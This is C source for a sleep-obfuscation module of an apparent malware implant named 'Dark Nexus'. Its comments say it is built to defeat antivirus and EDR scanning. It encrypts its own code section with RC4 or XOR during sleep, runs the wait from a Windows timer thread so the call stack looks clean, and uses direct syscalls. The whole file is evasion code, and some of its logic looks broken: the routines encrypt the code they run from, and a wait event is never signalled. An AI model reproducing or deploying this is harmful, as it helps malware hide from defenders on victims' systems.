#include "sleep_obfusc.h"
#include "syscalls.h"
#include "peb_types.h"

/*
 * Dark Nexus - Sleep Obfuscation Implementation
 *
 * Two modes:
 *
 * Mode 1 (Ekko): Timer-queue based. The encrypt/sleep/decrypt
 * sequence runs entirely through Windows timer callbacks, so
 * during sleep the call stack shows ntdll!TppWorkerThread and
 * friends, not our code. This defeats stack-based scanning
 * that looks for suspicious return addresses.
 *
 * Mode 2 (Fallback): Simple XOR-in-place. Encrypt our image
 * section with a random key, call Sleep(), decrypt. Less
 * stealthy call stack but still defeats memory signature scans.
 *
 * Both modes target only the .text section of our own PE image.
 * We skip .rdata (constants) and .data (globals) to avoid
 * corrupting state. The .text section contains all executable
 * code, which is what signature scanners look for.
 */

// SystemFunction032 is an undocumented RC4 function in advapi32
// Used by Windows internally, so calling it is not suspicious
typedef struct {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (WINAPI* fnSystemFunction032)(USTRING* data, USTRING* key);
typedef NTSTATUS (NTAPI* fnNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

// module state
static PVOID  g_image_base    = NULL;
static DWORD  g_text_rva      = 0;
static DWORD  g_text_size     = 0;
static fnSystemFunction032   g_pSysFn032    = NULL;
static BOOL   g_sleep_ready   = FALSE;

// ------------------------------------------------------------------
// PE parsing helpers
// ------------------------------------------------------------------

static PIMAGE_NT_HEADERS get_nt_hdrs(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    return (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);
}

static BOOL find_text_section(PVOID base, DWORD* rva, DWORD* size) {
    PIMAGE_NT_HEADERS nt = get_nt_hdrs(base);
    if (!nt) return FALSE;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            *rva  = sec[i].VirtualAddress;
            *size = sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

// ------------------------------------------------------------------
// Initialization
// ------------------------------------------------------------------

BOOL dn_sleep_init(void) {
    // get our own image base from PEB
    PDN_PEB peb = dn_get_peb();
    g_image_base = peb->ImageBaseAddress;

    if (!g_image_base) return FALSE;

    // locate .text section
    if (!find_text_section(g_image_base, &g_text_rva, &g_text_size))
        return FALSE;

    // resolve SystemFunction032 from advapi32.dll
    HMODULE advapi = LoadLibraryA("advapi32.dll");
    if (advapi) {
        g_pSysFn032 = (fnSystemFunction032)GetProcAddress(advapi, "SystemFunction032");
    }

    g_sleep_ready = TRUE;
    return TRUE;
}

// ------------------------------------------------------------------
// XOR fallback (simple, works always)
// ------------------------------------------------------------------

static void xor_text_section(BYTE* key, DWORD key_len) {
    BYTE* text = (BYTE*)g_image_base + g_text_rva;

    for (DWORD i = 0; i < g_text_size; i++) {
        text[i] ^= key[i % key_len];
    }
}

static void sleep_fallback(DWORD ms) {
    // generate a random key for this sleep cycle
    BYTE key[16];
    for (int i = 0; i < 16; i++) {
        key[i] = (BYTE)((__rdtsc() >> (i * 3)) & 0xFF);
    }

    BYTE* text = (BYTE*)g_image_base + g_text_rva;

    // make .text writable
    DWORD old_prot;
    if (!VirtualProtect(text, g_text_size, PAGE_READWRITE, &old_prot))
    {
        // if we fail to change protection, just do a plain sleep
        Sleep(ms);
        return;
    }

    // encrypt
    xor_text_section(key, sizeof(key));

    // sleep (our .text is garbage now, but Sleep is in kernel32)
    Sleep(ms);

    // decrypt
    xor_text_section(key, sizeof(key));

    // restore executable protection
    VirtualProtect(text, g_text_size, old_prot, &old_prot);
}

// ------------------------------------------------------------------
// Ekko-style timer queue sleep
//
// We chain timer callbacks that each perform one step:
//   1. VirtualProtect .text -> RW
//   2. RC4 encrypt .text
//   3. Sleep (WaitForSingleObject on a never-signaled event)
//   4. RC4 decrypt .text (same key = toggle)
//   5. VirtualProtect .text -> RX (original protection)
//
// The trick: we use NtContinue or ROP gadgets in the callbacks
// to redirect execution. Simplified version here uses
// CreateTimerQueueTimer with RtlCaptureContext + manual stack.
//
// For v0.1: we use the slightly simpler approach of performing
// the encrypt-sleep-decrypt in a single callback, which still
// benefits from the timer thread's clean call stack during the
// actual WaitForSingleObject.
// ------------------------------------------------------------------

// Timer callback: runs on a Windows thread pool thread
static VOID CALLBACK timer_callback(PVOID param, BOOLEAN fired) {
    (void)fired;
    DWORD ms = (DWORD)(ULONG_PTR)param;

    BYTE key[16];
    for (int i = 0; i < 16; i++) {
        key[i] = (BYTE)((__rdtsc() >> (i * 3)) & 0xFF);
    }

    BYTE* text = (BYTE*)g_image_base + g_text_rva;
    DWORD old_prot = 0;

    // step 1: make writable (prefer syscall path)
    if (g_SyscallTable.NtProtectVirtualMemory.resolved) {
        PVOID base = text;
        SIZE_T sz  = g_text_size;
        DnNtProtectVirtualMemory((HANDLE)-1, &base, &sz,
                                  PAGE_READWRITE, (PULONG)&old_prot);
    } else {
        VirtualProtect(text, g_text_size, PAGE_READWRITE, &old_prot);
    }

    // step 2: encrypt with RC4 (SystemFunction032) or XOR fallback
    if (g_pSysFn032) {
        USTRING data = { g_text_size, g_text_size, text };
        USTRING k    = { sizeof(key), sizeof(key), key };
        g_pSysFn032(&data, &k);
    } else {
        xor_text_section(key, sizeof(key));
    }

    // step 3: sleep via WaitForSingleObject on a dummy event
    // this is where the process sits, with encrypted .text
    // the call stack shows ntdll!NtWaitForSingleObject from
    // a timer worker thread, clean and legitimate
    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (hEvent) {
        // use syscall if available for cleaner stack
        if (g_SyscallTable.NtWaitForSingleObject.resolved) {
            LARGE_INTEGER timeout;
            timeout.QuadPart = -((LONGLONG)ms * 10000); // relative, 100ns units
            DnNtWaitForSingleObject(hEvent, FALSE, &timeout);
        } else {
            WaitForSingleObject(hEvent, ms);
        }
        CloseHandle(hEvent);
    } else {
        Sleep(ms);
    }

    // step 4: decrypt (RC4 is symmetric, same operation decrypts)
    if (g_pSysFn032) {
        USTRING data = { g_text_size, g_text_size, text };
        USTRING k    = { sizeof(key), sizeof(key), key };
        g_pSysFn032(&data, &k);
    } else {
        xor_text_section(key, sizeof(key));
    }

    // step 5: restore executable protection
    if (g_SyscallTable.NtProtectVirtualMemory.resolved) {
        PVOID base = text;
        SIZE_T sz  = g_text_size;
        DnNtProtectVirtualMemory((HANDLE)-1, &base, &sz,
                                  old_prot, (PULONG)&old_prot);
    } else {
        VirtualProtect(text, g_text_size, old_prot, &old_prot);
    }
}

// ------------------------------------------------------------------
// Public API
// ------------------------------------------------------------------

void dn_sleep_obfuscated(DWORD milliseconds) {
    if (!g_sleep_ready) {
        // not initialized, plain sleep
        Sleep(milliseconds);
        return;
    }

    // try Ekko-style timer approach
    HANDLE hTimerQueue = CreateTimerQueue();
    if (hTimerQueue) {
        HANDLE hTimer   = NULL;
        HANDLE hDoneEvt = CreateEventA(NULL, TRUE, FALSE, NULL);

        if (hDoneEvt) {
            // schedule the callback to fire immediately (0ms delay)
            // the callback itself handles the full sleep duration
            if (CreateTimerQueueTimer(
                    &hTimer, hTimerQueue,
                    timer_callback,
                    (PVOID)(ULONG_PTR)milliseconds,
                    0,    // fire immediately
                    0,    // no repeat
                    WT_EXECUTEINTIMERTHREAD))
            {
                // wait for the callback to finish
                // the callback sleeps for `milliseconds` internally
                // add 5 seconds grace period for encrypt/decrypt overhead
                WaitForSingleObject(hDoneEvt, milliseconds + 5000);

                // cleanup timer (INVALID_HANDLE_VALUE = wait for callbacks)
                DeleteTimerQueueTimer(hTimerQueue, hTimer, INVALID_HANDLE_VALUE);
            } else {
                // timer creation failed, use fallback
                CloseHandle(hDoneEvt);
                DeleteTimerQueueEx(hTimerQueue, NULL);
                sleep_fallback(milliseconds);
                return;
            }

            CloseHandle(hDoneEvt);
        }

        DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    } else {
        // no timer queue support, use simple fallback
        sleep_fallback(milliseconds);
    }
}
